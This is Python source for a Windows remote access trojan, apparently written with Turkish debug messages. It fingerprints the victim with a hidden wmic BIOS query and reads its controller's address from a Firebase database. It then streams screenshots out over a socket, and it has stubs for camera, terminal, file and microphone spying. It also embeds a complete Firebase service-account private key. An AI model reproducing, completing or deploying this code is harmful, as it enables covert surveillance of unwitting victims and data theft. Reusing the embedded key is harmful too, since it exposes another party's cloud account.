import io
import os
import pickle
import shutil
import subprocess
import sys
from ctypes import cdll
from socket import socket
from threading import Thread
from time import sleep

import cv2
from firebase_admin import credentials
from firebase_admin import db as realtime
from firebase_admin import initialize_app, storage
from PIL import ImageGrab
from pynput import keyboard, mouse
from win32api import GetLogicalDriveStrings

URL = "https://blank-72b5f-default-rtdb.europe-west1.firebasedatabase.app/" # firebase realtime database url

__USERSTRING__ = os.getlogin() + subprocess.check_output('wmic bios get serialnumber',
                                                             shell=True, stdin=subprocess.PIPE,
                                                             stderr=None,creationflags=0x08000000).decode().split('\n')[1].strip()

def connect(ip,port,data):
    try:
        soket = socket()
        soket.connect((ip,port))
        soket.sendall(bytes(data,'utf-8'))
        return soket
    except:
        return None

class WatchCamera(Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        pass

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class Terminal(Thread):
    def __init__(self):
        super().__init__()


    def run(self):
        pass

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class WatchScreen(Thread):
    def __init__(self) -> None:
        super().__init__()

    def run(self) -> None:
        while True:
            try:
                self.soket = socket()
                self.soket.connect((self.ip, self.port))
                break
            except Exception as e:
                print("Bağlanma denendi, hata: ", e)
                print("ip ve port: ", self.ip, self.port)
                sleep(1)
        while True:
            image_data = ImageGrab.grab().tobytes()
            length = len(image_data)
            self.soket.sendall(bytes(str(length).zfill(10), 'utf-8'))
            sleep(0.1)
            self.soket.sendall(image_data)
            sleep(0.1)

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class FileManager(Thread):
    def __init__(self) -> None:
        super().__init__()

    def run(self) -> None:
        pass

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class ListenVoice(Thread):
    def __init__(self) -> None:
        super().__init__()

    def run(self) -> None:
        pass

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class App:
    def __init__(self) -> None:
        self.ip = ""
        self.port = 0

        self.watch_screen_instance = WatchScreen()
        self.watch_camera_instance = WatchCamera()
        self.terminal_instance = Terminal()
        self.file_manager_instance = FileManager()
        self.listen_voice_instance = ListenVoice()

        self.firebase_manager = FirebaseManager()
        while True:
            try:
                data = self.soket.recv(1024).decode("utf-8")
                self.commander(data)
            except Exception as e:
                print("Client datası alınamadı: " + str(e))
                self.connect()

    def commander(self,cmd):
        if cmd == "exit":
            exit()
        elif cmd == "refresh":
            os.startfile(sys.argv[0])
            exit()
        elif cmd == "listen_voice":
            self.listen_voice_instance.start()
        elif cmd == "terminal":
            self.terminal_instance.start()
        elif cmd == "watch_screen":
            if self.watch_screen_instance.is_alive():
                self.watch_screen_instance.stop()
                self.watch_screen_instance.join()
            self.watch_screen_instance.start()
        elif cmd == "file_manager":
            self.file_manager_instance.start()
        elif cmd == "watch_camera":
            self.watch_camera_instance.start()
        else: 
            print("Yanlış gelen cmd:"+cmd)
            os.startfile(sys.argv[0])
            exit()

    def connect(self):
        try:
            if self.set_connection_data():
                self.soket = connect(self.ip, self.port,__USERSTRING__.ljust(100))
            else:
                print("Bağlantı bilgileri alınamadı")
        except Exception as e:
            print("Bağlantı kurulamadı: " + str(e))
            
    def set_connection_data(self) -> bool:
        connection_data = self.firebase_manager.get_tree("/socket")
        if connection_data is None:
            return False
        self.ip = connection_data["default"]["ip"]
        self.port = connection_data["default"]["port"]

        self.watch_camera_instance.set_connection_data(connection_data["watch_camera"]["ip"],connection_data["watch_camera"]["port"])
        self.watch_screen_instance.set_connection_data(connection_data["watch_screen"]["ip"],connection_data["watch_screen"]["port"])
        self.terminal_instance.set_connection_data(connection_data["terminal"]["ip"],connection_data["terminal"]["port"])
        return True

class FirebaseManager:
    service_json_data = { # unique firebase service json data
    "type": "service_account",
    "project_id": "blank-72b5f",
    "private_key_id": "f44b95d4737ce902a7708b1ee2829ff43178caf5",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCBBsDzm8Jgwmmy\n2znfkcdjo9Y1ZlAaLAynNaSJv43hLKnhn/CTM8wI3ES12DcLmMv3owTECLhUnQqF\nMFQ94U2vWuuJWtONm0FbGwK2+1gPOaS8U0Cgl4/2lpZPgncmRSYm3VmGtBYzCxv8\nDvPyMigVGS9eq4zwQQi1ADFANqBtg1qBl0Or9vl7t8jH3NqGI0zF6ZKpjv/+j4uh\nBDJSf33LvBYlgYbLu0Xw6smZhth4DeJaeazR0cuNjTleKOYZVrhTXj4GrPpsIN3u\nFPSN6HsSfVtBpTfVlgoUSIhKPNUDHnHNcwW9a+il5VEVPhTbqYmiQLQ47ASkc/Fa\nYNsnurT5AgMBAAECggEAGCApaZOtFZccmP0tddymDf9HUT5TiYVFi2l4HeqjrqBB\nlqbnnrqvctOvBFqMtl4oe2IvxLEFuIqRukRGaDit5DVJt+n0BzUp1A15pTnbpiMm\n5rDhc3XLjTXsnqrcORtybg9zC0E2qm4wGiI4ooeW35UROrA0nwLmDCQgUWu1dSx3\nwy2jIqtGLBprOg8tM2WmFza6aPgPpFzErymx4T4hYv0YFbNJ9qqWKDD3ipWxIBNd\nJs05TGzdeVipW/mZc++OhSbKmzy1VWx/EE6VI+2meYWnstWq0KBgOGE4nqIOzw3U\nwnSkALqNE6vheLqqlfBp5hiBBD1rijd47b1vHPzghQKBgQC1y030belW/sRdfBZm\nl8xd6OZuNXnXZmAWwv/A5YvftavgiyCNKXsnmGCZUHA5V3MdAoKQR75rkWXApcYG\nSV036oMFJekqwEEbxqlfVWPXdMyt8fQ9k5c1cP8btWYTAbJ38E6fpPi1Rlcb2rX4\ng+zfCprFzY2whxgm1tkGes5mFQKBgQC1sXJxKEQhpwSC4yVmo0RIe2zTb2YE23c9\nwk2Z+HWnfrXkX7G4MyW7ZtI8XqSIdJHd3v64BUUfgFpeE5c5ASq0kxdBttNPhmZQ\n1MoJP1/o+YnmM79g60eB4725BggQ/FurZHAPhEVkM14H7MIGDNVWIuGuf8pb6h0G\n8OLJaWuQVQKBgFG4Ni6uSboFhBfR8+/iRMfiLdNUzpR5PLB+r6DyjtHdRIoHgHZ0\nMxw1bxb8BbaBDQn5Wt+ooHySO39CBaZFzFWaYZMq24mQKrRltTVZmSv9IRUAMp6L\nfelUBhlajav1k1g++djhu7shB39J7YrtIsmQZsqMACleUQkEg0JaafWRAoGAZPYq\nkqh+W3jUb+rKgKMesWwsR70yImbVdrL+rh07O4yUhEeMmL+LKvxyvGsW4GBuIazl\nO9pp05xeGsKmGF4GnfrSRIjUGO+k8Suc7NCTegEX2JxOrwtuW8XySdsJJm8kfTO9\ndVHZwVkt2hd8pSICde/CGlYWW0bXRGEclDEJPVUCgYEAk8mR7eY9WSXM46qCoEyN\nr1MsNJMEyg5245LsQq0khLjkLDzJ4/WybVD8uoA4Kyunei6Te+Wc5izHS3Qb0uHx\n+f1V8O0E5L4JYVWaxu4NYBKGJvRYiIQ5OrdrG+CK8w5BsHR/ruLXn288t4y+GEtt\nw0o8qY03QYOyWdBrrJpchtE=\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-wwjty@blank-72b5f.iam.gserviceaccount.com",
    "client_id": "110522629390398068058",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-wwjty%40blank-72b5f.iam.gserviceaccount.com",
    "storageBucket":"blank-72b5f.appspot.com"
    }

    def __init__(self) -> None:
        # initialize the firebase
        cred = credentials.Certificate(FirebaseManager.service_json_data)
        initialize_app(cred,{"storageBucket":"blank-72b5f.appspot.com"})
        self.__bucket = storage.bucket()        

    def get_tree(self,path = "/") -> dict:
        return realtime.reference(path,url=URL).get()

    def upload_string(self,string:str,file_name:str,timout = 5, retry_count = -1,delay = 5) -> bool:
        if (retry_count == -1):
            while 1:
                try:
                    blob = self.__bucket.blob(file_name)
                    blob.upload_from_string(string,timeout=timout)
                    return True
                except Exception as e:
                    print("11- Error: "+str(e))
                sleep(delay)
        else:
            for i in range(retry_count):
                try:
                    blob = self.__bucket.blob(file_name)
                    blob.upload_from_string(string,file_name,timeout=timout)
                    return True
                except Exception as e:
                    print("2- Error: "+str(e))
                sleep(delay)
            return False



App()
